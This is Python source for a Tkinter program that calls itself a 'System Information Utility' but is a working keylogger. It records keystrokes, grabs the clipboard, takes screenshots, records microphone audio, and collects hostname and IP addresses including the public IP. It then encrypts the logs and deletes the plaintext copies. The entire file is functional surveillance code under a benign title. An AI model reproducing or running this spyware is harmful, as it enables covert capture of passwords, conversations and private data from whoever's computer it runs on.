import os
import time
import socket
import getpass
import platform
import win32clipboard
import sounddevice as sd
import tkinter as tk
from tkinter import scrolledtext
from requests import get
from PIL import ImageGrab
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import threading

class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        master.title("System Information Utility")
        master.geometry("600x500")
        
        # UI Elements
        self.notebook = tk.Frame(master)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Control Panel
        self.control_frame = tk.Frame(self.notebook)
        self.control_frame.pack(fill=tk.X, pady=5)
        
        self.start_button = tk.Button(self.control_frame, text="Start Monitoring", command=self.start_keylogger, bg="#4CAF50", fg="white", padx=10)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = tk.Button(self.control_frame, text="Stop Monitoring", command=self.stop_keylogger, bg="#F44336", fg="white", padx=10)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        self.status_label = tk.Label(self.control_frame, text="Status: Idle", bg="#EEEEEE", padx=5, pady=2)
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        # Log Area
        self.log_area = scrolledtext.ScrolledText(self.notebook, width=70, height=25)
        self.log_area.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Initialize keylogger variables
        self.file_path = os.path.dirname(os.path.abspath(__file__))
        self.extend = "\\"
        self.file_merge = self.file_path + self.extend
        
        self.keys_information = "key_log.txt"
        self.system_information = "systeminfo.txt"
        self.clipboard_information = "clipboard.txt"
        self.audio_information = "audio.wav"
        self.screenshot_information = "screenshot.png"
        
        self.keys_information_e = "e_key_log.txt"
        self.system_information_e = "e_systeminfo.txt"
        self.clipboard_information_e = "e_clipboard.txt"
        
        self.microphone_time = 10
        self.time_iteration = 15
        self.number_of_iterations_end = 3
        
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
        self.is_running = False
        self.keylogger_thread = None
        self.currentTime = 0
        self.stoppingTime = 0
        
        self.log_area.insert(tk.END, "System Information Utility initialized.\n")
        self.log_area.insert(tk.END, f"Working directory: {self.file_path}\n")
        self.log_area.insert(tk.END, "Ready to start monitoring...\n")
        self.log_area.see(tk.END)

    def log_message(self, message):
        self.log_area.insert(tk.END, f"{message}\n")
        self.log_area.see(tk.END)
        self.master.update()

    def computer_information(self):
        self.log_message("Collecting system information...")
        
        if not os.path.exists(self.file_merge + self.system_information):
            open(self.file_merge + self.system_information, "w").close()
            
        with open(self.file_merge + self.system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + "\n")
                self.log_message(f"Public IP: {public_ip}")
            except:
                f.write("Couldn't get Public IP Address\n")
                self.log_message("Couldn't retrieve public IP")
            
            processor_info = platform.processor()
            f.write("Processor: " + processor_info + '\n')
            self.log_message(f"Processor: {processor_info}")
            
            system_info = platform.system() + " " + platform.version()
            f.write("System: " + system_info + '\n')
            self.log_message(f"System: {system_info}")
            
            machine_info = platform.machine()
            f.write("Machine: " + machine_info + "\n")
            self.log_message(f"Machine: {machine_info}")
            
            f.write("Hostname: " + hostname + "\n")
            self.log_message(f"Hostname: {hostname}")
            
            f.write("Private IP Address: " + IPAddr + "\n")
            self.log_message(f"Private IP: {IPAddr}")
            
        self.log_message("System information collected successfully")

    def copy_clipboard(self):
        self.log_message("Collecting clipboard data...")
        
        with open(self.file_merge + self.clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                
                f.write("Clipboard Data: \n" + pasted_data)
                self.log_message(f"Clipboard captured: {pasted_data[:30]}...")
            except:
                f.write("Clipboard could not be copied")
                self.log_message("Could not access clipboard")
                
        self.log_message("Clipboard collection complete")

    def microphone_recording(self):
        self.log_message(f"Recording audio for {self.microphone_time} seconds...")
        
        fs = 44100
        seconds = self.microphone_time
        
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        
        write(self.file_merge + self.audio_information, fs, myrecording)
        self.log_message("Audio recording complete")

    def screenshot(self):
        self.log_message("Taking screenshot...")
        
        im = ImageGrab.grab()
        im.save(self.file_merge + self.screenshot_information)
        
        self.log_message("Screenshot saved")

    def encrypt_files(self):
        self.log_message("Encrypting collected data...")
        
        files_to_encrypt = [
            self.file_merge + self.system_information, 
            self.file_merge + self.clipboard_information, 
            self.file_merge + self.keys_information
        ]
        
        encrypted_file_names = [
            self.file_merge + self.system_information_e, 
            self.file_merge + self.clipboard_information_e, 
            self.file_merge + self.keys_information_e
        ]
        
        for i, file_path in enumerate(files_to_encrypt):
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                encrypted = self.fernet.encrypt(data)
                
                with open(encrypted_file_names[i], 'wb') as f:
                    f.write(encrypted)
                    
                self.log_message(f"Encrypted: {os.path.basename(file_path)}")
            except Exception as e:
                self.log_message(f"Encryption error for {os.path.basename(file_path)}: {str(e)}")
        
        self.log_message("Encryption complete")

    def delete_files(self):
        self.log_message("Cleaning up temporary files...")
        
        delete_files = [
            self.system_information, 
            self.clipboard_information, 
            self.keys_information, 
            self.screenshot_information, 
            self.audio_information
        ]
        
        for file in delete_files:
            try:
                os.remove(self.file_merge + file)
                self.log_message(f"Deleted: {file}")
            except:
                self.log_message(f"Could not delete: {file}")
        
        self.log_message("Cleanup complete")

    def keylogger_function(self):
        self.log_message("Starting keylogger...")
        
        # Create or clear the keylogger file
        with open(self.file_merge + self.keys_information, "w") as f:
            f.write("")
        
        self.number_of_iterations = 0
        self.currentTime = time.time()
        self.stoppingTime = time.time() + self.time_iteration
        
        while self.number_of_iterations < self.number_of_iterations_end and self.is_running:
            self.count = 0
            self.keys = []
            
            def on_press(key):
                if not self.is_running:
                    return False
                    
                self.keys.append(key)
                self.count += 1
                self.currentTime = time.time()
                
                # Display the key in the UI
                key_str = str(key).replace("'", "")
                if hasattr(key, 'char'):
                    if key.char:
                        key_str = key.char
                
                self.log_message(f"Key pressed: {key_str}")
                
                if self.count >= 1:
                    self.count = 0
                    self.write_keys_to_file()
                    self.keys = []
            
            def on_release(key):
                if not self.is_running:
                    return False
                    
                if key == Key.esc:
                    self.log_message("ESC key pressed - stopping keylogger")
                    return False
                    
                if self.currentTime > self.stoppingTime:
                    return False
            
            self.listener = Listener(on_press=on_press, on_release=on_release)
            self.listener.start()
            
            while self.currentTime <= self.stoppingTime and self.is_running:
                time.sleep(0.1)
                self.master.update()
            
            self.listener.stop()
            
            if self.is_running:
                self.log_message(f"Iteration {self.number_of_iterations + 1} complete")
                self.screenshot()
                self.copy_clipboard()
                
                self.number_of_iterations += 1
                self.currentTime = time.time()
                self.stoppingTime = time.time() + self.time_iteration
        
        if self.is_running:
            self.log_message("Keylogger monitoring complete")
            self.encrypt_files()
            self.delete_files()
            self.is_running = False
            self.status_label.config(text="Status: Idle")

    def write_keys_to_file(self):
        with open(self.file_merge + self.keys_information, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def start_keylogger(self):
        if not self.is_running:
            self.is_running = True
            self.status_label.config(text="Status: Running")
            
            self.log_message("=== Starting monitoring session ===")
            self.computer_information()
            self.copy_clipboard()
            self.screenshot()
            
            try:
                self.microphone_recording()
            except:
                self.log_message("Error: Could not record audio")
            
            self.keylogger_thread = threading.Thread(target=self.keylogger_function, daemon=True)
            self.keylogger_thread.start()

    def stop_keylogger(self):
        if self.is_running:
            self.log_message("Stopping all monitoring activity...")
            self.is_running = False
            
            if hasattr(self, 'listener') and self.listener.is_alive():
                self.listener.stop()
            
            if self.keylogger_thread and self.keylogger_thread.is_alive():
                self.keylogger_thread.join(1.0)
            
            self.status_label.config(text="Status: Stopped")
            self.log_message("=== Monitoring stopped ===")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
